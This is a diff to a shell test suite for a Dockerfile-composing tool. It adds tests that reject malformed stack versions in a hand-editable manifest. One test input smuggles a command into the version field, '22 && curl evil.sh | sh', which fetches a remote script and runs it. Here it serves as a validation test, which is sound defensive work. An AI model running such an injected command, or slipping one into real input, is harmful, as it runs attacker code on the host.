@@ -246,6 +246,25 @@ check "and so does an empty list" \
     "$(with_manifest '{"packages":[]}' | sha256sum)" "$(node "$COMPOSE" | sha256sum)"
 
 
+# --- a stack's version, held to a version's shape (debt
+# manifest-limits-and-stack-versions-reach-docker-unvalidated, gh-326) ---------
+#
+# The version is substituted into the stack's Dockerfile.frag, inside RUN
+# lines, which the host's daemon executes — the same reason "packages" is
+# held to a Debian package name's shape, and the version was not. The Quick
+# Pick offers only versions.json's entries, but the manifest is hand-editable
+# and arrives with a clone.
+
+set +e
+out="$(with_manifest '{"node":"22 && curl evil.sh | sh"}' node 2>"$work/err")"; rc=$?
+set -e
+check "a version that is not a shape refuses the compose" "$rc $(printf '%s' "$out" | wc -c | tr -d ' ')" "1 0"
+check "and names the stack, the value and the form" "$(grep -cF "is not a version's shape" "$work/err" || true)" "1"
+check "naming the file it came from" "$(grep -cF "'node' version in" "$work/err" || true)" "1"
+check "a shaped version the list does not carry still composes" \
+    "$(with_manifest '{"node":"22.11.1"}' node | grep -c '22.11.1' || true)" "2"
+
+
 # **The java stack names its JDK to the editor** (debt
 # the-editor-imports-gradle-with-a-java-the-project-does-not-use). Without it the
 # Java language support imported Gradle with the JRE it bundles (25), and Gradle
@@ -298,8 +317,14 @@ for v in $(jq -r '.[]' "$HERE/../stacks/java/versions.json"); do
             "$(jq -r '."java.jdt.ls.java.home" // "unset"' <<<"$settings")" "unset"
     done
 done
-check "a version with JSON's own characters cannot break the label" \
-    "$(label_with '{"java": "21\"x"}' java | jq -e 'type == "array"' >/dev/null 2>&1 && echo parses || echo broken)" "parses"
+# The version is now refused before it reaches the fragment, which is a
+# stronger protection than escaping it in the label: a value with JSON's own
+# characters never gets that far.
+set +e
+out="$(with_manifest '{"java":"21\"x"}' java 2>"$work/err")"; rc=$?
+set -e
+check "a version with JSON's own characters is refused, not substituted" "$rc $(printf '%s' "$out" | wc -c | tr -d ' ')" "1 0"
+check "and names the stack and the form" "$(grep -cF "is not a version's shape" "$work/err" || true)" "1"
 for dir in "$HERE"/../stacks/*/; do
     stack="$(basename "$dir")"
     check "$stack: composed alone, no placeholder is left in its label" "$(label_of "$stack" | grep -c '{{' || true)" "0"
